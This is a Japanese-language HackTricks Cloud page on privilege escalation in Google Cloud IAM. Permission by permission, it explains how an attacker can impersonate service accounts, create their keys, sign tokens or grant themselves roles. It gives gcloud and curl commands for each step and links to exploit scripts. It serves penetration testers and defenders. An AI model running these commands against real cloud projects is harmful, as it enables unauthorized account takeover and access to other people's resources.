# GCP - IAM Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## IAM

IAMに関する詳細情報は以下を参照してください:

{% content-ref url="../gcp-services/gcp-iam-and-org-policies-enum.md" %}
[gcp-iam-and-org-policies-enum.md](../gcp-services/gcp-iam-and-org-policies-enum.md)
{% endcontent-ref %}

### `iam.roles.update` (`iam.roles.get`)

上記の権限を持つ攻撃者は、あなたに割り当てられたロールを更新し、他のリソースに対する追加の権限を付与することができます:
```bash
gcloud iam roles update <rol name> --project <project> --add-permissions <permission>
```
スクリプトを見つけることができます **脆弱な環境の作成、悪用、およびクリーンアップを自動化するためのスクリプトはこちら** そして、この特権を悪用するためのpythonスクリプトは[**こちら**](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.roles.update.py)です。詳細については[**オリジナルの研究**](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)を確認してください。

### `iam.serviceAccounts.getAccessToken` (`iam.serviceAccounts.get`)

上記の権限を持つ攻撃者は、**サービスアカウントに属するアクセストークンを要求することができる**ため、自分の権限よりも高い権限を持つサービスアカウントのアクセストークンを要求することが可能です。
```bash
gcloud --impersonate-service-account="${victim}@${PROJECT_ID}.iam.gserviceaccount.com" \
auth print-access-token
```
自動化スクリプトは[**こちら**](https://github.com/carlospolop/gcp\_privesc\_scripts/blob/main/tests/4-iam.serviceAccounts.getAccessToken.sh)で見つけることができ、この権限を悪用するためのpythonスクリプトは[**こちら**](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.serviceAccounts.getAccessToken.py)で見つけることができます。詳細については[**オリジナルの研究**](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)を確認してください。

### `iam.serviceAccountKeys.create`

上記の権限を持つ攻撃者は、**Service Accountのユーザー管理キーを作成**することができ、これによりそのService AccountとしてGCPにアクセスすることが可能になります。
```bash
gcloud iam service-accounts keys create --iam-account <name> /tmp/key.json

gcloud auth activate-service-account --key-file=sa_cred.json
```
自動化スクリプトは[**こちら**](https://github.com/carlospolop/gcp\_privesc\_scripts/blob/main/tests/3-iam.serviceAccountKeys.create.sh)で見つけることができ、pythonスクリプトは[**こちら**](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.serviceAccountKeys.create.py)で見つけることができます。詳細については[**オリジナルの研究**](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)を確認してください。

**`iam.serviceAccountKeys.update`はSAのキーを変更するためには機能しない**ことに注意してください。なぜなら、そのためには`iam.serviceAccountKeys.create`の権限も必要だからです。

### `iam.serviceAccounts.implicitDelegation`

もし、あるService Accountに対して**`iam.serviceAccounts.implicitDelegation`**の権限を持っていて、そのService Accountが第三のService Accountに対して**`iam.serviceAccounts.getAccessToken`**の権限を持っている場合、implicitDelegationを使用して**その第三のService Accountのトークンを作成する**ことができます。以下の図はその説明を助けるためのものです。

![](https://rhinosecuritylabs.com/wp-content/uploads/2020/04/image2-500x493.png)

[**ドキュメント**](https://cloud.google.com/iam/docs/understanding-service-accounts)によると、`gcloud`の委任は[**generateAccessToken()**](https://cloud.google.com/iam/credentials/reference/rest/v1/projects.serviceAccounts/generateAccessToken)メソッドを使用してトークンを生成する場合にのみ機能することに注意してください。ここではAPIを直接使用してトークンを取得する方法を示します:
```bash
curl -X POST \
'https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/'"${TARGET_SERVICE_ACCOUNT}"':generateAccessToken' \
-H 'Content-Type: application/json' \
-H 'Authorization: Bearer '"$(gcloud auth print-access-token)" \
-d '{
"delegates": ["projects/-/serviceAccounts/'"${DELEGATED_SERVICE_ACCOUNT}"'"],
"scope": ["https://www.googleapis.com/auth/cloud-platform"]
}'
```
自動化スクリプトは[**こちら**](https://github.com/carlospolop/gcp\_privesc\_scripts/blob/main/tests/5-iam.serviceAccounts.implicitDelegation.sh)で見つけることができ、この権限を悪用するためのPythonスクリプトは[**こちら**](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.serviceAccounts.implicitDelegation.py)で見つけることができます。詳細については[**オリジナルの研究**](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)を参照してください。

### `iam.serviceAccounts.signBlob`

上記の権限を持つ攻撃者は、**GCPで任意のペイロードに署名**することができます。したがって、**SAの署名されていないJWTを作成し、それをblobとして送信してターゲットのSAに署名させる**ことが可能です。詳細については[**こちら**](https://medium.com/google-cloud/using-serviceaccountactor-iam-role-for-account-impersonation-on-google-cloud-platform-a9e7118480ed)を参照してください。

自動化スクリプトは[**こちら**](https://github.com/carlospolop/gcp\_privesc\_scripts/blob/main/tests/6-iam.serviceAccounts.signBlob.sh)で見つけることができ、この権限を悪用するためのPythonスクリプトは[**こちら**](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.serviceAccounts.signBlob-accessToken.py)および[**こちら**](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.serviceAccounts.signBlob-gcsSignedUrl.py)で見つけることができます。詳細については[**オリジナルの研究**](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)を参照してください。

### `iam.serviceAccounts.signJwt`

上記の権限を持つ攻撃者は、**正しく形成されたJSON Webトークン（JWT）に署名**することができます。前の方法との違いは、**JWTを含むblobに署名させる代わりに、すでにJWTを期待しているsignJWTメソッドを使用する**ことです。これにより使用が簡単になりますが、任意のバイトではなくJWTにのみ署名できます。

自動化スクリプトは[**こちら**](https://github.com/carlospolop/gcp\_privesc\_scripts/blob/main/tests/7-iam.serviceAccounts.signJWT.sh)で見つけることができ、この権限を悪用するためのPythonスクリプトは[**こちら**](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.serviceAccounts.signJWT.py)で見つけることができます。詳細については[**オリジナルの研究**](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)を参照してください。

### `iam.serviceAccounts.setIamPolicy` <a href="#iam.serviceaccounts.setiampolicy" id="iam.serviceaccounts.setiampolicy"></a>

上記の権限を持つ攻撃者は、**サービスアカウントにIAMポリシーを追加**することができます。これを悪用して、**必要な権限を自分に付与**し、サービスアカウントを偽装することができます。以下の例では、興味のあるSAに対して`roles/iam.serviceAccountTokenCreator`ロールを自分に付与しています:
```bash
gcloud iam service-accounts add-iam-policy-binding "${VICTIM_SA}@${PROJECT_ID}.iam.gserviceaccount.com" \
--member="user:username@domain.com" \
--role="roles/iam.serviceAccountTokenCreator"

# If you still have prblem grant yourself also this permission
gcloud iam service-accounts add-iam-policy-binding "${VICTIM_SA}@${PROJECT_ID}.iam.gserviceaccount.com" \ \
--member="user:username@domain.com" \
--role="roles/iam.serviceAccountUser"
```
自動化スクリプトは[**こちら**](https://github.com/carlospolop/gcp_privesc_scripts/blob/main/tests/d-iam.serviceAccounts.setIamPolicy.sh)**で見つけることができます**。

### `iam.serviceAccounts.actAs`

**iam.serviceAccounts.actAs permission**は**AWSのiam:PassRole permission**に似ています。これは、Compute Engineインスタンスの起動などのタスクを実行するために不可欠であり、Service Accountとして「actAs」する能力を付与し、安全な権限管理を確保します。これがないと、ユーザーが不適切なアクセスを得る可能性があります。さらに、**iam.serviceAccounts.actAs**の悪用にはさまざまな方法があり、それぞれに一連の権限が必要であり、他の方法とは対照的に1つの権限だけでは済みません。

#### Service account impersonation <a href="#service-account-impersonation" id="service-account-impersonation"></a>

Service accountを偽装することは、**新しいより良い権限を取得する**ために非常に有用です。以下の3つの方法で[他のService accountを偽装](https://cloud.google.com/iam/docs/understanding-service-accounts#impersonating_a_service_account)することができます：

* **RSA private keysを使用した認証**（上記でカバー）
* **Cloud IAM policiesを使用した認可**（ここでカバー）
* **GCPサービスにジョブをデプロイ**（ユーザーアカウントの侵害により適用）

### `iam.serviceAccounts.getOpenIdToken`

上記の権限を持つ攻撃者は、OpenID JWTを生成することができます。これらはアイデンティティを主張するために使用され、必ずしもリソースに対する暗黙の認可を持つわけではありません。

この[**興味深い投稿**](https://medium.com/google-cloud/authenticating-using-google-openid-connect-tokens-e7675051213b)によると、オーディエンス（トークンを使用して認証したいサービス）を指定する必要があり、Googleによって署名されたJWTが返され、そのJWTのService accountとオーディエンスが示されます。

OpenIDTokenを生成するには（アクセス権がある場合）：
```bash
# First activate the SA with iam.serviceAccounts.getOpenIdToken over the other SA
gcloud auth activate-service-account --key-file=/path/to/svc_account.json
# Then, generate token
gcloud auth print-identity-token "${ATTACK_SA}@${PROJECT_ID}.iam.gserviceaccount.com" --audiences=https://example.com
```
次に、それを使用してサービスにアクセスできます:
```bash
curl -v -H "Authorization: Bearer id_token" https://some-cloud-run-uc.a.run.app
```
いくつかのサービスは、この種のトークンを介した認証をサポートしています：

* [Google Cloud Run](https://cloud.google.com/run/)
* [Google Cloud Functions](https://cloud.google.com/functions/docs/)
* [Google Identity Aware Proxy](https://cloud.google.com/iap/docs/authentication-howto)
* [Google Cloud Endpoints](https://cloud.google.com/endpoints/docs/openapi/authenticating-users-google-id) (Google OIDCを使用している場合)

サービスアカウントの代わりにOpenIDトークンを作成する方法の例は[**こちら**](https://github.com/carlospolop-forks/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.serviceAccounts.getOpenIdToken.py)で見つけることができます。

## 参考文献

* [https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)

{% hint style="success" %}
AWS Hackingを学び、練習する:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hackingを学び、練習する: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェック！
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)をフォローしてください**。**
* **ハッキングトリックを共有するには、** [**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出してください。

</details>
{% endhint %}
